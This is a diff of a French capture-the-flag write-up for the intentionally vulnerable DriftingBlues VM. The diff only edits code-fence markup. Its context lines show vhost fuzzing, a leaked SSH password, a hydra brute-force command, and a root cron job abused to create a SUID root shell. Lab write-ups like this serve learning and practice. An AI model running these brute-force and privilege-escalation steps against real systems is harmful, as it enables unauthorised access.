@@ -8,7 +8,7 @@ First of the name
 
 [DriftingBlues](https://www.vulnhub.com/entry/driftingblues-1,625/), ici le premier d'une grande lignée de VMs intentionnellement vulnérables dans l'unique but de s'amuser et apprendre, a été conçu par [tasiyanci](https://twitter.com/tasiyanci).  
 
-```plain
+```
 Not shown: 65533 closed tcp ports (reset) 
 PORT   STATE SERVICE VERSION 
 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) 
@@ -42,7 +42,7 @@ Le site *dcode.fr* dispose [d'un interpréteur](https://www.dcode.fr/langage-ook
 
 Voyons un peu les virtual hosts qui retournent une réponse différente de celle par défaut (à savoir ici une taille différente de 7710 octets) :  
 
-```plain
+```
 $ ffuf -w /fuzzdb/discovery/dns/alexaTop1mAXFRcommonSubdomains.txt -u http://192.168.56.6/ -H "Host: FUZZ.driftingblues.box" -fs 7710 
 
         /'___\  /'___\           /'___\        
@@ -77,7 +77,7 @@ Après beaucoup d'énumération je trouve sur ce vhost un fichier... *robots.txt
 
 Le plus intéressant est une URL interdite qui mentionne un accès SSH :  
 
-```plain
+```
 User-agent: *
 Disallow: /ssh_cred.txt
 Allow: /never
@@ -88,7 +88,7 @@ Allow: /never/gonna/give/up
 
 Le message :  
 
-```plain
+```
 we can use ssh password in case of emergency. it was "1mw4ckyyucky".
 
 sheryl once told me that she added a number to the end of the password.
@@ -98,7 +98,7 @@ sheryl once told me that she added a number to the end of the password.
 
 C'est toujours un plaisir de résoudre un problème avec une ligne de Python :  
 
-```plain
+```
 $ python3 -c "[print(f'1mw4ckyyucky{i}') for i in range(10)]" > pass.txt
 $ hydra -L users.txt -P pass.txt ssh://192.168.56.6
 --- snip ---
@@ -112,7 +112,7 @@ Ce compte dispose du premier flag mais n'a aucune règle sudo associée. L'outil
 
 En revanche on peut monitorer les process avec [pspy](https://github.com/DominicBreuker/pspy) et là on a quelque chose de plus intéressant :  
 
-```plain
+```
 2022/01/19 01:25:01 CMD: UID=0    PID=20942  | /usr/bin/zip -r -0 /tmp/backup.zip /var/www/  
 2022/01/19 01:25:01 CMD: UID=0    PID=20941  | /bin/sh /var/backups/backup.sh  
 2022/01/19 01:25:01 CMD: UID=0    PID=20940  | /bin/sh -c /bin/sh /var/backups/backup.sh  
@@ -122,7 +122,7 @@ En revanche on peut monitorer les process avec [pspy](https://github.com/Dominic
 
 Le dernier script mentionné est manquant :  
 
-```plain
+```
 eric@driftingblues:~$ file /tmp/emergency 
 /tmp/emergency: cannot open `/tmp/emergency' (No such file or directory)
 ```
@@ -137,7 +137,7 @@ chmod 4755 /tmp/g0tr00t
 
 On attend que la tâche CRON s'exécute et on a notre shell :  
 
-```plain
+```
 eric@driftingblues:/tmp$ ./g0tr00t -p 
 g0tr00t-4.3# id 
 uid=1001(eric) gid=1001(eric) euid=0(root) groups=1001(eric) 
